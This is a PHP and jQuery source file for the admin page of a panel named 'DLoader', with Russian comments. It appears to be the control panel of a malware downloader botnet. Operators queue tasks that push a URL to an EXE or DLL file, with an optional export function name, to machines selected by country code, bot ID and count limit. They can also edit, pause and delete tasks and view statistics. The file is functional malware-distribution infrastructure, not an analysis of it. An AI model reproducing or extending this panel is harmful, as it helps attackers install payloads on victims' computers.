<?php
header ("Content-type: text/html; charset=utf-8");

require("config.php");
require("ln/ln.php");
$config["language"] == "ru" ? $l = "ru" : $l = "en";

if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] !== $config["user"] || $_SERVER['PHP_AUTH_PW'] !== $config["pass"])
{
	header('WWW-Authenticate: Basic realm="Login"');
	header('HTTP/1.0 401 Unauthorized');
	exit;
}



// для того, чтобы подключаемые скрипты через инклюд обрабатывались с нормальным путем (у них внутри проверка)
$pageIncluded=true;

?>

<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>DLoader</title>
<link rel="icon" href="images/favicon.png" type="image/x-icon">
<style type="text/css">
<? 
	// сжимаем стили и вырезаем комментарии
	$css=file_get_contents('./styles/style.css');
	$css=preg_replace("/(\/\*[\s\S]*?\*\/|[\r]|[\n]|[\r\n])/", "", $css);
	$css=str_replace("\t"," ",$css);
	$css=preg_replace("/\s+/", " ", $css);
	echo $css."\r\n";
?>
</style>

<script src="<?=WEB_ROOT;?>/js/jquery-1.4.4.min.js"></script>
<script>

	$(document).ready(function(){
		// инициализируем фишки на страничке
		pageInit();
	});

/* 	инициализация  */
	function pageInit() {
		$('.fileType').click(function(){
			if ($(this).val()=='dll') {
				$('.isDllFunctionPresent').attr('disabled',false);
			} else {
				$('.isDllFunctionPresent').attr('disabled',true);
				$('.dllFunctionNameShow').slideUp();
				$('.isDllFunctionPresent').attr('checked',false);
			}
		});
		
		$('.isDllFunctionPresent').click(function(){
			if ($(this).is(':checked')) {
				$('.dllFunctionNameShow').fadeIn(500);
			} else {
				$('.dllFunctionNameShow').fadeOut(500);
			}
		});
		
		$('.bidToAll').click(function(){
			if ($(this).attr('checked')=='checked') {
				$('.bidValue').attr('disabled',true);
			} else {
				$('.bidValue').attr('disabled',false);
				$('.bidValue').focus();
			}
		})
	}

	// загрузка страницы
	function pageLoad(sets) {
		// sets {page:'',addones:''}
		// показываем фразу о загрузке
		$('div.loading').slideDown();
		// убираем контент
		$('div.container').slideUp('slow', function(){
			// выполняем ajax запрос
			$.ajax({
				url: '<?=WEB_ROOT;?>/pages/'+sets.page+'.php',
				cache: false,
				//ifModified: true,
				async: true,
				success: function(data) {
					// убираем сообщение о загрузке
					$('div.loading').slideUp();
					// добавляем контент
					$('div.container').html(data);
					// выполняем дополнительное действие после показа контента
					if (sets.addones) {
						sets.addones=='setError' ? setError(sets.arg1) : false;
					}
					// показываем контент
					$('div.container').slideDown();
					// перебиндиваем
					pageInit();
				},
				error: function(data) {
					// если ошибка то в лог браузера
					// убираем сообщение о загрузке
					$('div.container').slideUp('slow', function(){
						// на страницу с ошибкой
						pageLoad({page:'error',addones:'setError',arg1:sets.page+'.php is '+data.status});
						return;
					});						
				},
				complete: function(data) {}
			});
		});
	}
	
	function setError(error) {
		$('.content').html($('.content').html().replace('{errorCode}',error));
	}

/* 	выбор ручного ввода стран в задачах */
	function CCinputType(obj) {
		if (obj.value=='ManualSelect') {
			$('#ccall').slideUp();
			$('#ccusr').slideDown();
			$('#expl').slideDown();
		} else { 
			$('#ccall').slideDown();
			$('#expl').slideUp();
			$('#ccusr').slideUp();
		}
		return;
	}

/* поставление задачи в очередь */
	function doLoadUrl() {
			if ($('#urlInput').val()=='' || $('#urlInput').val()=='http://') {
				$('#noURL').css('width','20em');
				$('#noURL').css('height','4em');
				$('#noURL').css('background-color','#fff');
				$('#noURL').addClass('blue shadow rounded');
				$('#noURL').css('border','2px solid gray');
				$('#noURL').css('text-align','center');
				$('#noURL').css('position','absolute');
				$('#noURL').css('paddingTop','2em');
				$('#noURL').css('zIndex','99999');
				$('#noURL').css('top',($(window).height()-200-$('#noURL').height())/2+$(window).scrollTop()+'px');
				$('#noURL').css('left',($(window).width()-$('#noURL').width())/2+$(window).scrollLeft()+'px');
				$('#noURL').html('No URL or URL is empty!').fadeIn().delay(3000).fadeOut();
				return;
			}
			$('#ldn').show();
			var ccarray=get_selected_cc();
			if (ccarray=='' || ccarray==undefined) { return; }
			var obj = { 'url':'', 'fileType':'', 'funcName':'', 'cc':ccarray, 'command':'', 'bid':'all', 'limit':''}; 
			obj.url = $('#urlInput').val()
			$('.fileType').each(function(){
				if ($(this).attr('checked')) { obj.fileType=$(this).val(); }
			});
			
			$('.command').each(function(){
				if ($(this).is(':checked')) { obj.command=$(this).val(); }
			});
			
			obj.limit=$('.limitNumber').val();
			
			if ($('.bidToAll').attr('checked')=='checked') { obj.bid='all'; } else { obj.bid=$('.bidValue').val(); }
			
			if (obj.fileType=='dll' && $('.isDllFunctionPresent').is(':checked')) { obj.funcName=$('.dllFunctionName').val(); }
			
            $.ajax({
				type: "POST",
				url: '<?=WEB_ROOT;?>/includes/uplUrl_backend.php',
				data: obj,
				success: function(data){
					$('#filesTable tbody:last').append(data);
					$('#ldn').hide();
				}	
			});
	}	

/* 	создание массива выбранных стран */
	function get_selected_cc() {
		var ccarray = '';
		if (document.getElementById('ccusr').style.display=='none') {
			var c_count=document.getElementById('cccount').value;
			for (var i=0;i<=c_count;i++) {
				if (document.getElementById('cc_'+i).checked) { ccarray+=i+','; }
			}
			if (ccarray=='') {ccarray=''+0;}
			// if non, select all
		} else {
			if (document.getElementById('ccusr').value=='') { $('#ldn').hide(); alert('Enter CC!'); return; }
				var uel=document.getElementById('ccusr').value;
				ccarray = $.ajax({type:"GET", url: "<?=WEB_ROOT;?>/includes/get_kktocc.php?line="+uel, async: false}).responseText;
				// if non, select all in php script
		}
		return ccarray;
	}
	
/* 	переключение всех стран или выбора вручную */
	function dizCB() {
		var c_count=document.getElementById('cccount').value;
		if (document.getElementById('cc_0').checked==true) {
			for (var i=1;i<=c_count;i++) {
				document.getElementById('cc_'+i).disabled='true';
				document.getElementById('cc_'+i).checked='on';
			}
		} else {
			for (var i=1;i<=c_count;i++) {
				document.getElementById('cc_'+i).disabled='';
				document.getElementById('cc_'+i).checked='';
			}		
		}
	}


/* 	редактирование задачи */
	function doEdit(id,obj) {
		$.get('<?=WEB_ROOT;?>/includes/get_task_info.php',{fid: id},
			function(data){
				$('#ccusrEdit').val(data);
				$('#urlEdit').val(document.getElementById('url'+id).innerHTML);
			}
		);
		$('#editTaskID').val(id);
		$('#editWindow').show();
	}

/* 	обновление стран */
	function doUpdateCc() {
		$.get('<?=WEB_ROOT;?>/includes/update_cc.php', {fid: $('#editTaskID').val(), cc: $('#ccusrEdit').val()},
   			function(data){
				pageLoad({page:'tasks'});
			}
		);	
	}
	
/* 	обновление ссылки */
	function doUpdateUrl() {
		$.get('<?=WEB_ROOT;?>/includes/update_url.php', {fid: $('#editTaskID').val(), url: $('#urlEdit').val()},
   			function(data){
				pageLoad({page:'tasks'});
			}
		);	
	}	


/* 	удаление задачи */
	function doDel(fid,obj) {
		$.get('<?=WEB_ROOT;?>/includes/del_backend.php', {id: fid},
   			function(data){
				$(obj).parent().parent().remove();
			}
		);
	}
	
/* 	приостановка задачи */
	function doStopTask(id,obj) {

		$.ajax({
			type: "GET",
			cache: false,
			ifModified: true,
			async: true,			
			url: '<?=WEB_ROOT;?>/includes/update_stop.php',
			data: {fid: id},
			success: function(data){
   				if (data=='-1') { alert('ERROR'); return false; }
   				if (data=='0') {
   					$(obj).html('<?=$lang[$l][8];?>');
   				} else {
   					$(obj).html('<?=$lang[$l][9];?>');
   				}
			}	
		});
	}
	
/* 	очистка базы	 */
	function trunk() {
		if (!confirm("Уверены, что хотите удалить стату и задачи?")) { return; }
		$.get('<?=WEB_ROOT;?>/includes/trunk.php?t=all', {},
   			function(data){
   				if (data=='ok') { pageLoad({page:'stat'}); } else { alert(data); }				
			}
		);			
	}

/* 	очистка статы базы	 */
	function trunkStat() {
		if (!confirm("Уверены, что хотите удалить стату?")) { return; }
		$.get('<?=WEB_ROOT;?>/includes/trunk.php?t=stat', {},
   			function(data){
   				if (data=='ok') { pageLoad({page:'stat'}); } else { alert(data); }				
			}
		);			
	}

</script>

</head>
<body>
<div id="container">
	<a href="<?=WEB_ROOT;?>/admin.php" style="outline:none;border:0;"><img src="<?=WEB_ROOT;?>/images/logo.png"  style="outline:none;border:0;"></a>
	<?=$lang[$l][60];?>, <b><?=$_SERVER['PHP_AUTH_USER'];?></b>
	<br>
		<div class="navigation" align="center" style="margin-bottom:5px; margin-top:10px;">
		<a href="#" title="..." onClick="pageLoad({page:'stat'});">Статистика</a>
		<a href="#" title="..." onClick="pageLoad({page:'tasks'});">Задачи</a>
		<a href="#" title="..." onClick="pageLoad({page:'options'});">Управление</a>
		</div>

		<div id="body">
			<div class="loading" style="width:100%;display:none;text-align:center;"><h2>Подождите мы <span class="blue">Загружаемся</span>...</h2></div>
			<div class="container">
				<? 
				// структура для вывода страниц при обращении напрямую
				if (isset($_GET['page'])) {
					switch ($_GET['page']) {
						case 'error':		include('./pages/error.php');		break;
						case 'stat':		include('./pages/stat.php');		break;
						case 'tasks':		include('./pages/tasks.php');		break;
						case 'options':		include('./pages/options.php');		break;
						default: include('./pages/404.php');
					}
				} else {
					include('./pages/stat.php');
				}
				?>
			</div>


	<div class="clear"></div>
	</div>

	<div id="footer">
		<div class="footer-content">
			<p>Все &copy; на DLoader resident защищены грубой физической силой 2010-2011</p>
		</div>
	</div>
</div>
</body>
</html>